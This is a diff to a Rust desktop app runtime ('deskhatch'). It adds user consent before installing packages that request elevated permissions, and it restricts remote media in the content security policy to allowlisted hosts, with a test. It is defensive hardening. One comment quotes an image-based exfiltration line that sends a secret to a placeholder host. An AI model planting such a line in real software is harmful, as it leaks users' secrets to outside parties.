@@ -31,6 +31,62 @@ const SHIM_JS: &str = include_str!("../gallery/hatch.js");
 
 /// Test-only: the expression `--eval` runs inside the window, see `schedule_test_eval`.
 static TEST_EVAL: std::sync::OnceLock<String> = std::sync::OnceLock::new();
+/// A package opened from a file manager that needs the user's approval before it is installed.
+static PENDING_INSTALL: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();
+
+/// Ask on the terminal. Without a terminal (scripts, CI) the answer is no; pass --yes instead.
+fn confirm_in_terminal(warning: &str) -> bool {
+    use std::io::{BufRead, IsTerminal, Write};
+    eprintln!("{warning}");
+    if !std::io::stdin().is_terminal() {
+        eprintln!("deskhatch: no terminal to confirm on; run again with --yes to install anyway");
+        return false;
+    }
+    eprint!("Install? [y/N] ");
+    let _ = std::io::stderr().flush();
+    let mut line = String::new();
+    let _ = std::io::stdin().lock().read_line(&mut line);
+    matches!(line.trim().to_ascii_lowercase().as_str(), "y" | "yes")
+}
+
+/// Install a package the user opened (double-click, drag onto the dock), asking first when it
+/// wants more than the `web` tier, names a model endpoint or replaces an installed app. Runs the
+/// dialog off the main thread so the event loop keeps going.
+fn install_with_consent(app: AppHandle, p: PathBuf) {
+    std::thread::spawn(move || {
+        let warning = match packages::peek(&p) {
+            Ok(Some(m)) => packages::install_warning(&m),
+            Ok(None) => None,
+            Err(e) => {
+                eprintln!("deskhatch: cannot open {}: {e}", p.display());
+                return;
+            }
+        };
+        if let Some(w) = warning {
+            use tauri_plugin_dialog::{DialogExt, MessageDialogButtons, MessageDialogKind};
+            let yes = app
+                .dialog()
+                .message(w)
+                .title("Install this app?")
+                .kind(MessageDialogKind::Warning)
+                .buttons(MessageDialogButtons::OkCancelCustom("Install".into(), "Cancel".into()))
+                .blocking_show();
+            if !yes {
+                eprintln!("deskhatch: the user declined to install {}", p.display());
+                return;
+            }
+        }
+        match packages::import(&p, None) {
+            Ok(m) => {
+                let standalone = packages::launcher_is_standalone(&m);
+                let _ = packages::create_launcher_for(&m, standalone);
+                let _ = spawn_app(&m.id);
+                let _ = app.emit("hatch:refresh", ());
+            }
+            Err(e) => eprintln!("deskhatch: cannot open {}: {e}", p.display()),
+        }
+    });
+}
 
 /// Managed state: which app this process hosts (None = gallery).
 pub struct AppCtx {
@@ -41,7 +97,7 @@ pub struct AppCtx {
 
 fn usage() -> ! {
     eprintln!(
-        "deskhatch {}\n\nUSAGE:\n  deskhatch                         open the gallery\n  deskhatch --app <id>              run an installed app\n  deskhatch --dev <dir>             run an app folder with live reload\n  deskhatch install <src> [--name N] [--no-launcher] [--standalone] [--run]\n                                    src = folder with app.json | file.hatch | page.html\n  deskhatch new \"<prompt>\" [--name N] [--tier web|desktop|full] [--model M] [--run]\n  deskhatch list\n  deskhatch relink                  re-create every launcher (after a runtime update)\n  deskhatch uninstall <id>\n  deskhatch export <id> [--out <dir>]\n  deskhatch config [--provider P] [--model M] [--endpoint URL]\n  deskhatch key <provider>          read an API key from stdin and store it in the OS keychain\n  deskhatch models                  list models from the configured endpoint\n  deskhatch doctor                  print paths and configuration\n  deskhatch <file.hatch>            install and run a package",
+        "deskhatch {}\n\nUSAGE:\n  deskhatch                         open the gallery\n  deskhatch --app <id>              run an installed app\n  deskhatch --dev <dir>             run an app folder with live reload\n  deskhatch install <src> [--name N] [--no-launcher] [--standalone] [--run] [--yes]\n                                    src = folder with app.json | file.hatch | page.html\n                                    --yes: install without asking when the app wants more than the web tier\n  deskhatch new \"<prompt>\" [--name N] [--tier web|desktop|full] [--model M] [--run]\n  deskhatch list\n  deskhatch relink                  re-create every launcher (after a runtime update)\n  deskhatch uninstall <id>\n  deskhatch export <id> [--out <dir>]\n  deskhatch config [--provider P] [--model M] [--endpoint URL]\n  deskhatch key <provider>          read an API key from stdin and store it in the OS keychain\n  deskhatch models                  list models from the configured endpoint\n  deskhatch doctor                  print paths and configuration\n  deskhatch <file.hatch>            install and run a package",
         env!("CARGO_PKG_VERSION")
     );
     std::process::exit(2)
@@ -119,6 +175,13 @@ fn main() {
         Some("install") => {
             let src = args.get(1).cloned().unwrap_or_else(|| usage());
             let name = flag(&args, "--name");
+            if let Ok(Some(peeked)) = packages::peek(Path::new(&src)) {
+                if let Some(w) = packages::install_warning(&peeked) {
+                    if !has(&args, "--yes") && !confirm_in_terminal(&w) {
+                        fatal("not installed");
+                    }
+                }
+            }
             let m = packages::import(Path::new(&src), name.as_deref()).unwrap_or_else(|e| fatal(&e.to_string()));
             println!("installed {} ({}) -> {}", m.name, m.id, store::app_dir(&m.id).display());
             if !has(&args, "--no-launcher") {
@@ -257,6 +320,14 @@ fn main() {
             // A path (file association / drag and drop onto the binary).
             let p = Path::new(other);
             if p.exists() {
+                // Opened from a file manager: anything that asks for more than `web` is shown to
+                // the user in a dialog first, from the gallery.
+                let needs_ok = matches!(packages::peek(p), Ok(Some(ref pm)) if packages::install_warning(pm).is_some());
+                if needs_ok {
+                    let _ = PENDING_INSTALL.set(p.to_path_buf());
+                    run_gui(None, false);
+                    return;
+                }
                 let m = packages::import(p, None).unwrap_or_else(|e| fatal(&e.to_string()));
                 let _ = packages::create_launcher(&m);
                 run_gui(Some(store::app_dir(&m.id)), false)
@@ -480,6 +551,9 @@ fn run_gui(app_dir: Option<PathBuf>, dev: bool) {
                 (Some(m), Some(dir)) => setup_app(app, m.clone(), dir.clone(), state.dev)?,
                 _ => setup_gallery(app)?,
             }
+            if let Some(p) = PENDING_INSTALL.get() {
+                install_with_consent(app.handle().clone(), p.clone());
+            }
             Ok(())
         });
 
@@ -499,15 +573,7 @@ fn run_gui(app_dir: Option<PathBuf>, dev: bool) {
         if let tauri::RunEvent::Opened { urls } = &event {
             for u in urls {
                 if let Ok(p) = u.to_file_path() {
-                    match packages::import(&p, None) {
-                        Ok(m) => {
-                            let standalone = packages::launcher_is_standalone(&m);
-                            let _ = packages::create_launcher_for(&m, standalone);
-                            let _ = spawn_app(&m.id);
-                            let _ = app.emit("hatch:refresh", ());
-                        }
-                        Err(e) => eprintln!("deskhatch: cannot open {}: {e}", p.display()),
-                    }
+                    install_with_consent(app.clone(), p);
                 }
             }
         }
@@ -768,19 +834,21 @@ fn set_dock_icon(icon: &tauri::image::Image<'_>) {
 fn csp_for(m: Option<&Manifest>) -> String {
     let tier = m.map(|m| m.permissions).unwrap_or(Tier::Full);
     let mut connect = String::from("ipc: http://ipc.localhost hatch:");
+    // Remote images, fonts and media are a way out too (`new Image().src = "https://x/?d=" + secret`),
+    // so they are allowed only from the same hosts as fetch: the ones listed in allowedHosts.
     let mut remote_media = String::new();
     if tier >= Tier::Desktop {
-        remote_media.push_str(" https:");
         if let Some(m) = m {
             for h in &m.allowed_hosts {
-                if h == "*" {
-                    connect.push_str(" https: http:");
+                let src = if h == "*" {
+                    " https: http:".to_string()
                 } else if h.contains("://") {
-                    connect.push(' ');
-                    connect.push_str(h);
+                    format!(" {h}")
                 } else {
-                    connect.push_str(&format!(" https://{h}"));
-                }
+                    format!(" https://{h}")
+                };
+                connect.push_str(&src);
+                remote_media.push_str(&src);
             }
         }
     }
@@ -880,7 +948,27 @@ fn percent_decode(s: &str) -> String {
 
 #[cfg(test)]
 mod tests {
-    use super::page_may_navigate;
+    use super::{csp_for, page_may_navigate};
+    use crate::manifest::Manifest;
+
+    fn manifest(json: &str) -> Manifest {
+        serde_json::from_str(json).unwrap()
+    }
+
+    #[test]
+    fn remote_media_only_from_allowed_hosts() {
+        let none = csp_for(Some(&manifest(r#"{"id":"a","name":"a","permissions":"desktop"}"#)));
+        assert!(!none.contains("https:"), "desktop without allowedHosts must not load remote media: {none}");
+        let one = csp_for(Some(&manifest(
+            r#"{"id":"a","name":"a","permissions":"desktop","allowedHosts":["api.example.com"]}"#,
+        )));
+        assert!(one.contains("img-src 'self' data: blob: hatch: https://api.example.com;"), "{one}");
+        assert!(!one.contains(" https: "), "{one}");
+        let web = csp_for(Some(&manifest(
+            r#"{"id":"a","name":"a","permissions":"web","allowedHosts":["api.example.com"]}"#,
+        )));
+        assert!(!web.contains("example.com"), "web ignores allowedHosts: {web}");
+    }
 
     fn nav(u: &str) -> bool {
         page_may_navigate(&u.parse().unwrap())
